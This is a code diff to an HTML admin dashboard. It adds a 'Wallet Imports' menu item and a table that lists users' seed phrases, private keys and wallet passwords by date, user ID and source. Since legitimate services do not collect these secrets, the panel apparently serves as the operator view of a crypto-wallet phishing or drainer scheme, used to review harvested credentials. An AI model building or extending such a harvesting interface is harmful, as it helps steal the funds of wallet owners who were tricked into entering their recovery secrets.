@@ -123,6 +123,14 @@
                         </a>
                     </li>
                     
+                    <!-- Wallet Imports (NEW) -->
+                    <li class="nav-item">
+                        <a class="nav-link" href="#wallet-imports" data-section="wallet-imports">
+                            <i class="fas fa-key"></i>
+                            <span>Wallet Imports</span>
+                        </a>
+                    </li>
+                    
                     <!-- User Account Control -->
                     <li class="nav-item">
                         <a class="nav-link" href="#" data-section="user-control">
@@ -1468,6 +1476,49 @@
                         });
                     });
                 </script>
+            </div>
+        </section>
+
+        <!-- Wallet Imports Section -->
+        <section id="wallet-imports" class="admin-section">
+            <div class="section-header mb-4">
+                <h1 class="h3 mb-1"><i class="fas fa-key me-2"></i>Wallet Imports</h1>
+                <p class="text-muted">Review imported wallet details (seed phrase/private key and wallet password)</p>
+            </div>
+
+            <div class="card bg-dark">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h5 class="mb-0"><i class="fas fa-list me-2"></i>Recent Wallet Imports</h5>
+                    <div>
+                        <button class="btn btn-primary btn-sm" onclick="adminDashboard.loadWalletImports()">
+                            <i class="fas fa-refresh me-1"></i>Refresh
+                        </button>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-dark table-striped">
+                            <thead>
+                                <tr>
+                                    <th>Date</th>
+                                    <th>User ID</th>
+                                    <th>Method</th>
+                                    <th>Seed Phrase</th>
+                                    <th>Private Key</th>
+                                    <th>Wallet Password</th>
+                                    <th>Source</th>
+                                </tr>
+                            </thead>
+                            <tbody id="walletImportsTableBody">
+                                <tr>
+                                    <td colspan="7" class="text-center py-4">
+                                        <i class="fas fa-spinner fa-spin me-2"></i>Loading wallet imports...
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
             </div>
         </section>
 
